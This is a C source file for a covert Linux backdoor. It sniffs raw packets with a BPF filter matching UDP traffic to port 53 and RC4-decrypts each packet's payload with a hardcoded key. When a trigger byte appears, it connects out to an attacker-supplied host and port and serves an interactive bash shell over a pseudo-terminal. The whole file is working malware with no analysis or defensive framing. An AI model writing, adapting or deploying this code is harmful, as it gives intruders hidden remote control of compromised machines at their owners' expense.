#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <net/ethernet.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <linux/if_ether.h>
#include <linux/filter.h>
#include <pty.h>
#include <sys/select.h>

#define RC4_KEY "secret-key"

typedef struct {
    unsigned char state[256];
    unsigned char x;
    unsigned char y;
} RC4_CTX;

void rc4_init(RC4_CTX *ctx, unsigned char *key, int keylen) {
    int i;
    for (i = 0; i < 256; i++) ctx->state[i] = i;
    unsigned char j = 0;
    for (i = 0; i < 256; i++) {
        j = j + ctx->state[i] + key[i % keylen];
        unsigned char temp = ctx->state[i];
        ctx->state[i] = ctx->state[j];
        ctx->state[j] = temp;
    }
    ctx->x = 0;
    ctx->y = 0;
}

void rc4_crypt(RC4_CTX *ctx, unsigned char *data, int len) {
    int i;
    for (i = 0; i < len; i++) {
        ctx->x++;
        ctx->y += ctx->state[ctx->x];
        unsigned char temp = ctx->state[ctx->x];
        ctx->state[ctx->x] = ctx->state[ctx->y];
        ctx->state[ctx->y] = temp;
        unsigned char k = ctx->state[(ctx->state[ctx->x] + ctx->state[ctx->y]) & 0xFF];
        data[i] ^= k;
    }
}

void apply_bpf_filter(int sd);
void reverse_shell(char *host, int port);

int main() {
    int sd, pkt_size;
    char *buf;
    struct sockaddr_in src, dst;
    struct iphdr *ip_pkt;
    buf = malloc(65536);
    
    if ((sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
        perror("error creating socket");
        exit(1);
    }

    apply_bpf_filter(sd);

    while(1) {
        if ((pkt_size = recvfrom(sd, buf, 65536, 0, NULL, NULL)) < 0) {
            perror("error receiving from socket");
            exit(1);
        }

        ip_pkt = (struct iphdr *)(buf + sizeof(struct ether_header));
        memset(&src, 0, sizeof(src));
        memset(&dst, 0, sizeof(dst));

        unsigned char *data = malloc(32 * sizeof(char));
        memcpy(data, (unsigned char *)(buf + sizeof(struct ether_header) + sizeof(struct iphdr) + 8), 32);

        RC4_CTX rc4;
        rc4_init(&rc4, (unsigned char *)RC4_KEY, strlen(RC4_KEY));
        rc4_crypt(&rc4, data, 32);

        src.sin_addr.s_addr = ip_pkt->saddr;
        dst.sin_addr.s_addr = ip_pkt->daddr;
        
        if (data[0] == 0x58) {
            int i, j, pid;
            char host[16];
            char port_str[6];
            int port = 4444;

            for (i = 1; data[i] != 0x3A && data[i] != '\0' && (i - 1) < sizeof(host) - 1; i++) {
                host[i-1] = data[i];
            }
            host[i-1] = '\0'; 

            if (data[i] == 0x3A) {
                i++;
                for (j = 0; data[j + i] != '\0' && j < sizeof(port_str) - 1; j++) {
                    port_str[j] = data[j + i];
                }
                port_str[j] = '\0';
                port = atoi(port_str);
            }

            pid = fork();
            if (pid == 0) {
                printf("spawning\n");
                reverse_shell(host, port);
            }

            signal(SIGCHLD, SIG_IGN);
        }
        free(data);
    }

    close(sd);
    return 0;
}

void apply_bpf_filter(int sd) {
    // tcpdump udp and dst port 53 -dd
    struct sock_filter filter[] = {
        { 0x28, 0, 0, 0x0000000c },
        { 0x15, 0, 4, 0x000086dd },
        { 0x30, 0, 0, 0x00000014 },
        { 0x15, 0, 11, 0x00000011 },
        { 0x28, 0, 0, 0x00000038 },
        { 0x15, 8, 9, 0x00000035 },
        { 0x15, 0, 8, 0x00000800 },
        { 0x30, 0, 0, 0x00000017 },
        { 0x15, 0, 6, 0x00000011 },
        { 0x28, 0, 0, 0x00000014 },
        { 0x45, 4, 0, 0x00001fff },
        { 0xb1, 0, 0, 0x0000000e },
        { 0x48, 0, 0, 0x00000010 },
        { 0x15, 0, 1, 0x00000035 },
        { 0x6, 0, 0, 0x00040000 },
        { 0x6, 0, 0, 0x00000000 },
    };
    size_t filter_size = sizeof(filter) / sizeof(struct sock_filter);
    struct sock_fprog bpf = {
        .len = filter_size,
        .filter = filter,
    };

    if ((setsockopt(sd, SOL_SOCKET, SO_ATTACH_FILTER, &bpf, sizeof(bpf))) < 0) {
        perror("Error creating socket");
        exit(1);
    }
}

void reverse_shell(char *host, int port) {
    int sd;
    struct sockaddr_in cnc;

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
   
    memset((char *)&cnc, 0, sizeof(cnc));
    cnc.sin_family = AF_INET;
    cnc.sin_port = htons(port);
    cnc.sin_addr.s_addr = inet_addr(host);
    
    if (connect(sd, (struct sockaddr *) &cnc, sizeof(cnc)) < 0) {
        perror("connect failed");
        exit(1);
    }

    int master;
    pid_t pid = forkpty(&master, NULL, NULL, NULL);

    if (pid < 0) {
        perror("forkpty failed");
        exit(1);
    }
    
    if (pid == 0) {
        char *argv[] = {"/bin/bash", NULL};
        execve("/bin/bash", argv, NULL);
        exit(0);
    } else {
        char input[1024];
        fd_set rdfds;

        while (1) {
            FD_ZERO(&rdfds);
            FD_SET(sd, &rdfds);
            FD_SET(master, &rdfds);

            int maxfd = (sd > master) ? sd : master;

            if (select(maxfd + 1, &rdfds, NULL, NULL, NULL) < 0)
                break;

            if (FD_ISSET(sd, &rdfds)) {
                int n = read(sd, input, sizeof(input));
                if (n <= 0) break;
                write(master, input, n);
            }

            if (FD_ISSET(master, &rdfds)) {
                int n = read(master, input, sizeof(input));
                if (n <= 0) break;
                write(sd, input, n);
            }
        }
        close(sd);
        close(master);
    }
}